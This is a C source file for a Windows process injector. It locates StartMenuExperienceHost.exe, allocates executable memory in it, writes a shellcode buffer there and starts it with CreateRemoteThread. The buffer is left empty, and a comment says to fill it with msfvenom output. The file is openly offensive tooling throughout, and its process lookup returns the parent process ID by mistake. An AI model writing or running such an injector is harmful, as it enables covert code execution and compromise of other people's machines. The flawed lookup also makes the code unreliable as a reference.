#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>  //Gives us access to Windows system calls
#include <tlhelp32.h> //Gives us access to the system call for getting info about processes

unsigned char buf[] =
"";

//Replace this with the length of the shellcode generated. Check the msfvenom output for the length of the shellcode.
int bufSize = 354;

int findProcess(const char* processName) {
	int procID = 0;
	wchar_t wProcName[255];
	size_t converted;

	//convert the process name from char* to wchar_t*
	mbstowcs_s(&converted, wProcName, (size_t)255, processName, strlen(processName));

	//take a snapshot of all running processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32W proc;
	proc.dwSize = sizeof(PROCESSENTRY32W);

	//get information about the first process found in the snapshot
	if (Process32FirstW(snapshot, &proc)) {
		do {
			if (wcscmp(proc.szExeFile, wProcName) == 0) {
				printf("Process found: %ws - %d\n", proc.szExeFile, proc.th32ProcessID);
				CloseHandle(snapshot);
				return proc.th32ParentProcessID;
			}
		} while (Process32Next(snapshot, &proc));
	}
	CloseHandle(snapshot);
	return 0;
}

void injectPayload(HANDLE targetProcess, unsigned char* payload, unsigned int payloadLength) {
	LPVOID addr = NULL;
	SIZE_T bytesWritten;
	HANDLE malThread = NULL;

	//allocate memory in the target process
	addr = VirtualAllocEx(targetProcess, NULL, payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//god I love error handling
	if (addr == NULL) {
		printf("Failed to allocate memory in the target process.\n");
		return;
	}

	//write the payload into the allocated memory
	if (!WriteProcessMemory(targetProcess, addr, (PVOID)payload, (SIZE_T)payloadLength, &bytesWritten)) {
		printf("Failed to write memory in the target process.\n");
		return;
	}

	//create a thread in the target process to run the payload
	malThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

	if (malThread == NULL) {
		//error handling my beloved
		printf("Failed to create the remote thread.\n");
	}
}

int main(void) {
	int procID = 7608; //gotten from task manager
	HANDLE targetProcess; 

	//making sure that the process ID is correct bc I struggle to read small changing tables
	procID = findProcess("StartMenuExperienceHost.exe");
	if (procID == 0) {
		printf("Target process not found.\n");
		return 0;
	}

	//opening the target process with the necessary permissions
	targetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, procID);

	if (targetProcess == NULL) {
		printf("Failed to open the target process.\n");
		return 0;
	}

	//Inject the payload intot the target process
	injectPayload(targetProcess, buf, bufSize);

	CloseHandle(targetProcess);
	return 0;
}
